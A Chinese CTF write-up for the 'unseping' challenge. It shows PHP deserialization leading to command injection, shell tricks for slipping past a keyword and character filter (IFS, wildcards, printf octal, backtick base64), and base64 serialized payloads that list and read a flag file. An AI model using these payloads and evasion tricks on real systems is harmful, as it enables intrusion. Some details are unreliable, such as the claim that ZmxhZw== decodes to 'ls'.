# 题目：unseping

[![p9wBPDU.md.png](https://s1.ax1x.com/2023/05/08/p9wBPDU.md.png)](https://imgse.com/i/p9wBPDU)

+ 打开网页，发现是PHP代码审计类问题，页面代码如下：

  ```php
  <?php
  highlight_file(__FILE__);
  
  class ease{
      
      private $method;
      private $args;
      function __construct($method, $args) {
          $this->method = $method;
          $this->args = $args;
      }
   
      function __destruct(){
          if (in_array($this->method, array("ping"))) {
              call_user_func_array(array($this, $this->method), $this->args);
          }
      } 
   
      function ping($ip){
          exec($ip, $result);
          var_dump($result);
      }
  
      function waf($str){
          if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
              return $str;
          } else {
              echo "don't hack";
          }
      }
   
      function __wakeup(){
          foreach($this->args as $k => $v) {
              $this->args[$k] = $this->waf($v);
          }
      }   
  }
  
  $ctf=@$_POST['ctf'];
  @unserialize(base64_decode($ctf));
  ?>
  ```

## 代码分析

1. \($\_\_construct()$\)：类的初始化函数，当一个新类创建时就会自动调用；
   
   - 反序列化时不会调用执行$\_\_construct()$；
   
2. $\_\_destruct()$：当销毁一个对象时会自动调用，在销毁前可以执行一些操作；

3. $in\_array(search,~array)$：查找$search$是否存在于$array$内，需要注意$array$类型是数组，并不是子串匹配；

4. $call\_user\_func\_array(callback,~param\_arr)$：把$callback$当做函数执行，所需参数存在$param\_arr$数组内；

5. $exec(command,~output)$：在Linux命令行下执行字符串$command$，执行结果为$output$；

6. $var\_dump(var)$：打印变量$var$的详细信息，包括数据类型，值，长度等；

7. $pre\_match\_all(regexp,~str,~pat\_array)$：将$str$同正则表达式$regexp$比较，匹配结果存储在$pat\_array$数组中。若array不是空则返回$true$，否则$false$；

8. $\_\_wakeup()$：当反序列化执行时会先调用$\_\_wakeup()$，预处理数据。当序列化对象的属性个数大于真实的属性个数时会跳过执行$\_\_wakeup()$；

   - 例如，

     ```php
     <?php
         class person{
         public $name;
         public $age;
         function __construct($name, $age){
             $this->name = $name;
             $this->age = $age;
         }
     }
     $p = new("qyang", 19);
     echo serialize($p);
     ?>
     ```

     [![p9wgZwV.md.png](https://s1.ax1x.com/2023/05/08/p9wgZwV.md.png)](https://imgse.com/i/p9wgZwV)

     反序列化时为绕过$\_\_wakup()$的检查，需要将“对象属性个数”增大；

   8. $serilize(),~unserilize()$：将对象序列化，反序列化。序列化结果参考如上；

## 解题过程

通过分析代码，本题大致是将POST而来的ctf参数值，进行base64解码后再反序列化。

1. $\_\_wakeup()$使用$waf()$对参数进行了过滤，不允许出现$|~\&~;~空格~/~cat~flag~tac~php~ls$这些字符；
2. $\_\_destruct()$在销毁对象之前会看$\$method$是否存在字符串$"ping"$，如果存在则会进行$ping()$，这样会执行$exec()$，从而执行我们所需要的命令；

所以我们要构造一个base64编码后的且序列化后的ease对象（注意顺序：先序列化再编码），用于执行我们需要的Linux命令；

我们要构造的ease对象应该像这样的：$\$e~=~new~ease("ping",~"ls");$这样可以查看当前目录有哪些文件。但是“ls”被过滤掉了，所以我们考虑如何绕过过滤。

### Linux命令绕过

+ || 符号：当前一条命令执行结果为false 就执行下一条命令；

+ | 符号：只执行 | 符号后面的命令；

+ &&符号：当前一条命令执行结果为true 就执行下一条命令；

+ &符号：只执行 & 符号后面的命令；

+ ; 符号：不管前一条命令执行的结果是什么，执行下一条命令；

1. 变量覆盖

   ```
   a=l;b=s;$a$b
   ```

   [![p9wfA9U.md.png](https://s1.ax1x.com/2023/05/08/p9wfA9U.md.png)](https://imgse.com/i/p9wfA9U)

2. 反引号+base64解码

   ```
   `echo ZmxhZw== | base64 -d` 
   ```

   [![p9wfl4K.md.png](https://s1.ax1x.com/2023/05/08/p9wfl4K.md.png)](https://imgse.com/i/p9wfl4K)

   $ZmxhZw==$是命令$ls$的base64编码；

   $-d$表示解码，$-e$表示编码；

3. $\$1,~\$@,~\$*~''~""$混淆

   可以在原命令中插入这些字符并不影响命令的执行；

   ```
   l$1s
   l$@s
   l$*s
   l''s
   l""s
   ```

   [![p9whEIP.png](https://s1.ax1x.com/2023/05/08/p9whEIP.png)](https://imgse.com/i/p9whEIP)

   [![p9wIveH.md.png](https://s1.ax1x.com/2023/05/08/p9wIveH.md.png)](https://imgse.com/i/p9wIveH)

4. 换行执行命令

   使用换行符“\”并不影响命令执行

   ```
   ca\t \ f\la\g.txt
   ```

   [![p9whWsH.png](https://s1.ax1x.com/2023/05/08/p9whWsH.png)](https://imgse.com/i/p9whWsH)

5. 利用环境变量

   可以使用$echo~\{PATH\}$查看环境变量

   [![p9w4uY6.md.png](https://s1.ax1x.com/2023/05/08/p9w4uY6.md.png)](https://imgse.com/i/p9w4uY6)

   $\$\{PATH:a:b\}$,从索引$a$开始截取，截取长度为$b$（索引从$0$开始）；

   ```
   ${PATH:5:1}${PATH:2:1} //ls
   ```

   [![p9w467n.png](https://s1.ax1x.com/2023/05/08/p9w467n.png)](https://imgse.com/i/p9w467n)

6. $?~*$绕过

   $?$匹配任意一个字符，$*$匹配一个或多个字符；

   ```
   cat fl?g.?x?
   cat *lag.tx*
   ```

   [![p9w4Lh6.png](https://s1.ax1x.com/2023/05/08/p9w4Lh6.png)](https://imgse.com/i/p9w4Lh6)

7. 空格绕过

   空格可以用$\$IFS~\$\{IFS\}~\$IFS\$1~<~<>$符号替代；

   或者使用$\{\}$来括起命令从而省略空格；

   仅使用$\$IFS$时需要使用引号括起文件名；

   $\$IFS\$1$中可以是任何数字；

   $<~<>$使用较少，因为它们本身也是Linux的命令符号，可能导致命令解析错误；

   ```
   cat$IFS'flag.txt'
   cat${IFS}flag.txt
   cat<flag.txt
   cat<>flag.txt
   {cat,flag.txt}
   ```

   [![p9wI1Zd.png](https://s1.ax1x.com/2023/05/08/p9wI1Zd.png)](https://imgse.com/i/p9wI1Zd)

8. printf绕过

   $printf$格式化输出，可以将十六进制或八进制值转化为ASCII码输出；

   $()和``会先执行其包含的命令字符串，再将执行结果当做Linux命令执行；
   
   ```
   \NNN 
\xHH
   ```
   
   ```
   printf "\154\163"
   $(printf "\154\163")
   ```
   
   [![p9094gg.md.png](https://s1.ax1x.com/2023/05/08/p9094gg.md.png)](https://imgse.com/i/p9094gg)

### 构造payload

于是我们可以将“$ls$”命令构造成“$l\$*s$”，再进行序列化，base64编码等操作得到payload。

```php
<?php
    class ease{
    public $method;
    public $args;
    function __construct($method, $args){
        $this->method = $method;
        $this->args = $args;
    }
}
$e = new ease("ping", array("l$*s"));#注意结合代码分析，$args需要是数组类型
$f = serialize($e);
echo $f . "<br>";
echo base64_encode(serialize($e));
?>
```

[![p9w7iqg.md.png](https://s1.ax1x.com/2023/05/08/p9w7iqg.md.png)](https://imgse.com/i/p9w7iqg)

payload如下：

```
ctf=Tzo0OiJlYXNlIjoyOntzOjY6Im1ldGhvZCI7czo0OiJwaW5nIjtzOjQ6ImFyZ3MiO2E6MTp7aTowO3M6NDoibCQqcyI7fX0=
```

[![p9w7Zin.md.png](https://s1.ax1x.com/2023/05/08/p9w7Zin.md.png)](https://imgse.com/i/p9w7Zin)

发现存在一个文件夹，为$flag\_1s\_here$，构造$ls$指令

```
$e = new ease("ping", array('l$*s${IFS}f$*lag_1s_here'));
```

payload如下：

```
Tzo0OiJlYXNlIjoyOntzOjY6Im1ldGhvZCI7czo0OiJwaW5nIjtzOjQ6ImFyZ3MiO2E6MTp7aTowO3M6MjQ6ImwkKnMke0lGU31mJCpsYWdfMXNfaGVyZSI7fX0=
```

[![p9wHahn.md.png](https://s1.ax1x.com/2023/05/08/p9wHahn.md.png)](https://imgse.com/i/p9wHahn)

发现flag所在文件为$flag\_831b69012c67b35f.php$，构造$cat$指令：

```
$e = new ease("ping", array('ca$*t${IFS}f$*lag_1s_here$(printf${IFS}"\57")f$*lag_831b69012c67b35f.p$*hp'));
```

payload如下：

```
Tzo0OiJlYXNlIjoyOntzOjY6Im1ldGhvZCI7czo0OiJwaW5nIjtzOjQ6ImFyZ3MiO2E6MTp7aTowO3M6NzQ6ImNhJCp0JHtJRlN9ZiQqbGFnXzFzX2hlcmUkKHByaW50ZiR7SUZTfSJcNTciKWYkKmxhZ184MzFiNjkwMTJjNjdiMzVmLnAkKmhwIjt9fQ==
```

[![p90CxFP.md.png](https://s1.ax1x.com/2023/05/08/p90CxFP.md.png)](https://imgse.com/i/p90CxFP)

成功得到flag。
